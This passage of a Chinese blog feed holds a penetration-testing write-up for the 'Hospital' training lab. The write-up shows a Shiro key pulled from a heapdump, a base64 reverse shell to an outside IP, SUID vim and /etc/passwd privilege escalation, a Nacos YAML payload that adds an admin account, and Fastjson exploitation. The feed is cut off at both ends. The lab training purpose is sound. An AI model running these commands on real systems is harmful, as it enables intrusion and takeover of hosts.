应急响应-Linux日志分析 wp</a></p><p><a href="https://www.yuque.com/mash1r0-12d0u/nmeyw6/rsubnt6nw6gk16i5">Mash1r0-第一章 应急响应-Linux日志分析</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> SecurityResponse </tag>
            
            <tag> 玄机靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Hospital</title>
      <link href="/2024/09/30/Hospital/"/>
      <url>/2024/09/30/Hospital/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个 flag，分布于不同的靶机。</p><p>架构<br><img src="https://picx.zhimg.com/80/v2-2546293eafbdacc576f4eff024b81134_1440w.png"></p><table><thead><tr><th align="center">内网地址</th><th align="center">Host or FQDN</th><th align="center">简要描述</th></tr></thead><tbody><tr><td align="center">172.30.12.5</td><td align="center">Web01</td><td align="center">Spring + Shiro</td></tr><tr><td align="center">172.30.12.6</td><td align="center">Server02</td><td align="center">Nacos</td></tr><tr><td align="center">172.30.12.236 172.30.54.179</td><td align="center">Web03</td><td align="center">Fastjson</td></tr><tr><td align="center">172.30.54.12</td><td align="center">Web04</td><td align="center">Grafana + Postgresql</td></tr></tbody></table><h1 id="前期信息打点"><a href="#前期信息打点" class="headerlink" title="前期信息打点"></a>前期信息打点</h1><p>不知道为什么fscan最新版扫不出来8080端口，改成了1.8.2发现可以了</p><p>fscan扫描得到如下内容：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">D:\PenetrationW&gt;.\fscan64 -h 39.99.231.151</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 39.99.231.151   is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">39.99.231.151:22 open</span></span><br><span class="line"><span class="string">39.99.231.151:8080 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 2</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle: http://39.99.231.151:8080 code:302 len:0      title:None 跳转url: http://39.99.231.151:8080/login;jsessionid=9823AC0A558D9D6AE0C5066806C444E4</span></span><br><span class="line"><span class="string">[*] WebTitle: http://39.99.231.151:8080/login;jsessionid=9823AC0A558D9D6AE0C5066806C444E4 code:200 len:2005   title:医疗管理后台</span></span><br><span class="line"><span class="string">[+] http://39.99.231.151:8080 poc-yaml-spring-actuator-heapdump-file</span></span><br></pre></td></tr></table></figure></div><p>发现jsessionid&#x3D;xxx，明显的Shiro特征，同时发现有acatuator泄露</p><p>访问网站，弱口令<code>admin/admin123</code>直接登录了，但是没啥东西</p><p>8080端口存在一个网站和<code>heapdump</code>文件，访问<code>/actuator</code>目录</p><p>通过目录扫描发现其存在 Spring Boot Heapdump 泄露</p><p>&lt;39.99.231.151:8080&#x2F;actuator&#x2F;heapdump&gt;</p><p>我们通过<a href="https://github.com/whwlsfb/JDumpSpider">whwlsfb&#x2F;JDumpSpider</a>对Heapdump文件进行分析，得到 Shiro key</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">D:\PenetrationW\JDumpSpider&gt;java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump</span><br><span class="line">===========================================</span><br><span class="line">CookieRememberMeManager(ShiroKey)</span><br><span class="line">-------------</span><br><span class="line">algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES</span><br><span class="line"></span><br><span class="line">===========================================</span><br></pre></td></tr></table></figure></div><p>得到密钥</p><h1 id="漏洞利用-Spring-Boot-Heapdump-Shiro-Deserialization"><a href="#漏洞利用-Spring-Boot-Heapdump-Shiro-Deserialization" class="headerlink" title="漏洞利用(Spring Boot Heapdump + Shiro Deserialization)"></a>漏洞利用(Spring Boot Heapdump + Shiro Deserialization)</h1><p><img src="https://pic1.zhimg.com/80/v2-25a08160817596f537b369d78973a4ff_1440w.png"></p><p>生成内存马，蚁剑连接</p><p><img src="https://pic1.zhimg.com/80/v2-c9438886e10e22ce429a65ba435a7b10_1440w.png"><br>这个登录不进去，把文件改为jsp后缀可以(php后缀也不行)<br><img src="https://pic1.zhimg.com/80/v2-011989bec191546af562df7ec986c444_1440w.png"></p><p>连接过后我们直接反弹 shell</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuMjQ5Ljk5LjcxLzc5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line"><span class="comment"># bash -i &gt;&amp; /dev/tcp/123.249.99.71/799 0&gt;&amp;1</span></span><br></pre></td></tr></table></figure></div><p>反弹过后，直接尝试查找 SUID 权限，根据输出发现<code>vim.basic</code>具有<code>S</code>权限，<code>vim.basic</code>可以直接以<code>root</code>身份进行文件编辑</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">app@web01:/$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(app) gid=1000(app) <span class="built_in">groups</span>=1000(app)</span><br><span class="line">app@web01:/$ find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">/usr/bin/vim.basic</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure></div><h2 id="非预期-猜flag地址"><a href="#非预期-猜flag地址" class="headerlink" title="非预期(猜flag地址)"></a>非预期(猜flag地址)</h2><p><code>vim.basic /root/flag/flag01.txt</code>莫名其妙就出了</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">^C)     O))                              O))             O))</span><br><span class="line">root@hcss-ecs-6260:~#                O)  O))             O))</span><br><span class="line">O))     O))   O))     O)))) O) O))     O)O) O)   O))     O))</span><br><span class="line">O)))))) O)) O))  O)) O))    O)  O)) O))  O))   O))  O))  O))</span><br><span class="line">O))     O))O))    O))  O))) O)   O))O))  O))  O))   O))  O))</span><br><span class="line">O))     O)) O))  O))     O))O)) O)) O))  O))  O))   O))  O))</span><br><span class="line">O))     O))   O))    O)) O))O))     O))   O))   O)) O)))O)))</span><br><span class="line">                            O))</span><br><span class="line">flag01: flag&#123;5dad6d4a-087c-4de3-bb10-f899ac1c69a9&#125;</span><br></pre></td></tr></table></figure></div><p>为了后面方便操作，进行提权，输入</p><h2 id="一次性提权，不好用"><a href="#一次性提权，不好用" class="headerlink" title="一次性提权，不好用"></a>一次性提权，不好用</h2><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.basic -c <span class="string">&#x27;:python3 import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-pc&quot;, &quot;reset; exec bash -p&quot;)&#x27;</span></span><br></pre></td></tr></table></figure></div><p>就可以这个提权，也可以直接写入root公钥</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.basic /root/.ssh/authorized_keys</span><br><span class="line">i</span><br><span class="line">(公钥)</span><br><span class="line">esc : wq!</span><br></pre></td></tr></table></figure></div><h2 id="正宗提权方法-升级交互式终端"><a href="#正宗提权方法-升级交互式终端" class="headerlink" title="正宗提权方法(升级交互式终端)"></a>正宗提权方法(升级交互式终端)</h2><p>升级交互式终端，以欺骗某些命令让它们以为在合适的终端运行,vim.basic有suid权限，但是必须有tty，也就是交互式shell</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">script /dev/null -c bash</span><br><span class="line">ctrl+z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line"><span class="comment">#xterm-256color</span></span><br><span class="line"><span class="comment">#最后这条命令执行会说命令找不到，不知道为什么</span></span><br></pre></td></tr></table></figure></div><p>通过 vim.basic 修改 &#x2F;etc&#x2F;passwd 进行提权</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt 123 123456</span><br><span class="line"><span class="comment"># $1$123$7mft0jKnzzvAdU4t0unTG1</span></span><br></pre></td></tr></table></figure></div><p>生成密码<br>在 &#x2F;etc&#x2F;passwd 文件中添加个账户</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/passwd</span><br><span class="line"></span><br><span class="line">hacker:$1$123<span class="variable">$7mft0jKnzzvAdU4t0unTG1</span>:0:0:/root:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#退出的时候输入:wq!</span></span><br></pre></td></tr></table></figure></div><p>添加之后,su切换到新添加的帐号，这台服务器是 web01，获取 flag01 的值</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su hacker</span><br></pre></td></tr></table></figure></div><p>就有root权限了</p><h1 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h1><p>上传 fscan 进行扫描内网网段</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.30.12.5  netmask 255.255.0.0  broadcast 172.30.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe23:29cf  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:23:29:cf  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 67492  bytes 95599182 (95.5 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 16889  bytes 2373197 (2.3 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 784  bytes 68783 (68.7 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 784  bytes 68783 (68.7 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">./fscan -h 172.30.12.5/24 -hn 172.30.12.5</span><br><span class="line">bash: line 14: ./fscan: Permission denied</span><br><span class="line"><span class="built_in">chmod</span> 777 fscan</span><br><span class="line">./fscan -h 172.30.12.5/24 -hn 172.30.12.5</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 172.30.12.236   is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.30.12.6     is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 2</span></span><br><span class="line"><span class="string">172.30.12.6:445 open</span></span><br><span class="line"><span class="string">172.30.12.6:139 open</span></span><br><span class="line"><span class="string">172.30.12.6:135 open</span></span><br><span class="line"><span class="string">172.30.12.236:22 open</span></span><br><span class="line"><span class="string">172.30.12.236:8080 open</span></span><br><span class="line"><span class="string">172.30.12.236:8009 open</span></span><br><span class="line"><span class="string">172.30.12.6:8848 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 7</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.30.12.6</span></span><br><span class="line"><span class="string">   [-&gt;]Server02</span></span><br><span class="line"><span class="string">   [-&gt;]172.30.12.6</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found</span></span><br><span class="line"><span class="string">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos </span></span><br><span class="line"><span class="string">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass</span></span><br></pre></td></tr></table></figure></div><p>发现如下两个资产</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.30.12.6:8848 poc-yaml-alibaba-nacos poc-yaml-alibaba-nacos-v1-auth-bypass </span><br><span class="line">http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台</span><br></pre></td></tr></table></figure></div><p>上传frp进行socks5代理<br>访问<a href="http://172.30.12.6:8848/nacos/">http://172.30.12.6:8848/nacos/</a></p><p>内网<code>172.30.12.6</code>存在一台<code>nacos</code>服务，存在默认密码 <code>nacos/nacos</code><br><a href="http://172.30.12.236:8080/">http://172.30.12.236:8080</a>是存在fastjson服务</p><h1 id="flag02-Nacos-Client-Yaml-Deserialization"><a href="#flag02-Nacos-Client-Yaml-Deserialization" class="headerlink" title="flag02(Nacos Client Yaml Deserialization)"></a>flag02(Nacos Client Yaml Deserialization)</h1><p>我们先访问 Nacos 服务：<a href="http://172.30.12.6:8848/">http://172.30.12.6:8848</a></p><p>反手一个弱口令进入后台<code>nacos:nacos</code>，获取到的配置文件内容如下</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 8080</span><br><span class="line">  servlet:</span><br><span class="line">    context-path: /hello</span><br><span class="line"></span><br><span class="line">spring:</span><br><span class="line">  application:</span><br><span class="line">    name: db-config</span><br><span class="line">  cloud:</span><br><span class="line">    nacos:</span><br><span class="line">      discovery:</span><br><span class="line">        server-addr: 127.0.0.1:8848</span><br><span class="line">      config:</span><br><span class="line">        server-addr: 127.0.0.1:8848</span><br><span class="line">        file-extension: yaml</span><br><span class="line">        namespace: dev</span><br><span class="line">        group: DEFAULT_GROUP</span><br><span class="line">        data-id: db-config.yaml</span><br><span class="line">  datasource:</span><br><span class="line">    mysql:</span><br><span class="line">      url: jdbc:mysql://localhost:3306/test?useSSL=<span class="literal">false</span>&amp;serverTimezone=UTC&amp;allowPublicKeyRetrieval=<span class="literal">true</span></span><br><span class="line">      username: root</span><br><span class="line">      password: P@ssWord!!!</span><br><span class="line">  redis:</span><br><span class="line">    host: localhost</span><br><span class="line">    port: 6379</span><br><span class="line"></span><br><span class="line">management:</span><br><span class="line">  endpoints:</span><br><span class="line">    web:</span><br><span class="line">      exposure:</span><br><span class="line">        include: <span class="string">&#x27;*&#x27;</span></span><br></pre></td></tr></table></figure></div><p>我们用<a href="https://github.com/charonlight/NacosExploitGUI">charonlight&#x2F;NacosExploitGUI</a>工具检测一下存在的漏洞</p><p><img src="https://pic1.zhimg.com/80/v2-9ea20a54f5d52282327122f93829e96d_1440w.png"></p><p>根据检测结果我们尝试<code>Nacos Client Yaml</code>反序列化漏洞，修改<a href="https://github.com/artsploit/yaml-payload">artsploit&#x2F;yaml-payload</a>制作一个恶意包</p><p>只需要修改<code>AwesomeScriptEngineFactory.java</code>文件中的内容即可，我们直接添加一个管理员账户：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Admin123..(原本的密码)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;net user fmo fmo /add&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;net localgroup administrators fmo /add&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>然后我们将上面的源代码编译为jar包</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">D:\PenetrationW\script\yaml-payload&gt;D:\ProgrammingLanguage\java\jdk8-8u421\bin\javac -version</span><br><span class="line">javac 1.8.0_421</span><br><span class="line"></span><br><span class="line">D:\PenetrationW\script\yaml-payload&gt;D:\ProgrammingLanguage\java\jdk8-8u421\bin\javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line"></span><br><span class="line">D:\PenetrationW\script\yaml-payload&gt;D:\ProgrammingLanguage\java\jdk8-8u421\bin\jar -cvf yaml-payload.jar -C src/ .</span><br><span class="line">已添加清单</span><br><span class="line">正在添加: artsploit/(输入 = 0) (输出 = 0)(存储了 0%)</span><br><span class="line">正在添加: artsploit/AwesomeScriptEngineFactory.class(输入 = 1671) (输出 = 702)(压缩了 57%)</span><br><span class="line">正在添加: artsploit/AwesomeScriptEngineFactory.java(输入 = 1562) (输出 = 410)(压缩了 73%)</span><br><span class="line">正在忽略条目META-INF/</span><br><span class="line">正在添加: META-INF/services/(输入 = 0) (输出 = 0)(存储了 0%)</span><br><span class="line">正在添加: META-INF/services/javax.script.ScriptEngineFactory(输入 = 36) (输出 = 38)(压缩了 -5%)</span><br></pre></td></tr></table></figure></div><p>在当前目录发现新jar文件,上传到<code>Web01</code>入口机器中，然后起一个<code>Web服务</code>使之可以访问</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用root权限的web01</span></span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure></div><p>另外Jar路径填内网地址(<a href="http://172.30.12.5/payload.jar)%EF%BC%8C%E5%90%8C%E6%97%B6%E5%8F%AF%E4%BB%A5%E5%A4%9A%E6%89%A7%E8%A1%8C%E5%87%A0%E6%AC%A1%EF%BC%8C%E7%A1%AE%E4%BF%9D%E6%88%90%E5%8A%9F">http://172.30.12.5/payload.jar)，同时可以多执行几次，确保成功</a></p><p><img src="https://picx.zhimg.com/80/v2-a48b8d07ff144e60d000b01bd094fb15_1440w.png"></p><p>之后进行常规的远程桌面链接即可链接即可(不用管端口号)，最后在<code>Administrator</code>用户目录下发现 flag02(这台电脑是Windows)</p><h1 id="flag03-Fastjson-Deserialization"><a href="#flag03-Fastjson-Deserialization" class="headerlink" title="flag03(Fastjson Deserialization)"></a>flag03(Fastjson Deserialization)</h1><p>我们接着访问医院后台管理平台服务：<a href="http://172.30.12.236:8080/">http://172.30.12.236:8080/</a></p><p>Burp抓取登录包发现发送的为<code>Json</code>数据，猜测为<code>Fastjson</code>，发送<code>Payload</code>后得到版本号<code>1.2.45</code></p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br></pre></td></tr></table></figure></div><p><img src="https://picx.zhimg.com/80/v2-44c107056a9635991378458ee1aacdec_1440w.png"></p><p>172.30.12.236:8080是打Fastjson反序列化，这里直接用现成的burp插件<a href="https://github.com/amaz1ngday/fastjson-exp">amaz1ngday&#x2F;fastjson-exp</a>，抓登录的请求包，然后选择操作，再选择拓展，无论是send to fastjsonEcho还是send to fastjsonInject插件都能检验出来然后帮你拿shell<br><img src="https://pic1.zhimg.com/80/v2-91cbdaf95d7ace371d6c5d4447b8db80_1440w.png"><br>不过生成的马连不上，会显示initShellOpertion Fail，因为目标开启了session持久化，并且我们向session存入了不可被反序列化的数据，导致后续使用此session我们无法获取到之前存入的数据，解决办法是把生成的shell中的session替换成application，但他这个请求我没怎么看懂，改不来。但这个插件可以直接在消息请求头那里执行命令然后拿到执行结果，所以也不用连上去<br><img src="https://picx.zhimg.com/80/v2-5d471999ae7cd187f262711e8324c01f_1440w.png"></p><p>因为我想改密码，输入了命令<code>passwd</code>，导致web03靶机连接不了了，也不能getshell了，后面的部分也就打不了了，害，太可惜了，希望以后能补回来</p><h1 id="flag04-Grafana-Unauthorized-Arbitrary-File-Reading-PostgreSQL-Getshell"><a href="#flag04-Grafana-Unauthorized-Arbitrary-File-Reading-PostgreSQL-Getshell" class="headerlink" title="flag04(Grafana Unauthorized Arbitrary File Reading &amp; PostgreSQL Getshell)"></a>flag04(Grafana Unauthorized Arbitrary File Reading &amp; PostgreSQL Getshell)</h1><p>好像是多次代理的玩意</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://lca.xlog.app/chun-qiu-yun-jing-fang-zhen-ba-chang-Hospital-shi-cao?locale=zh">春秋云镜仿真靶场Hospital实操</a><br><a href="https://fushuling.com/index.php/2024/01/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hospital/">春秋云境-Hospital</a><br><a href="https://5ime.cn/yunjing-hospital.html">春秋云镜 Hospital Writeup</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Penetration </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权汇总</title>
      <link href="/2024/09/22/Linux%E6%8F%90%E6%9D%83/"/>
      <url>/2024/09/22/Linux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>最近在接触渗透，发现提权是一项必不可少的内容，特新建一篇记录使用过的提权方法</p><h1 id="使用suid-vim-basic文件实现提权"><a href="#使用suid-vim-basic文件实现提权" class="headerlink" title="使用suid vim.basic文件实现提权"></a>使用suid vim.basic文件实现提权</h1><p>要求：vim.basic文件有suid权限</p><p><code>chmod u+s /usr/bin/vim.basic</code>可以设置</p><p>先<code>adduser test1</code>一个普通权限用户,开始提权！</p><p>通过以下命令可以找到存在suid权限的文件</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null <span class="comment">#常用</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; 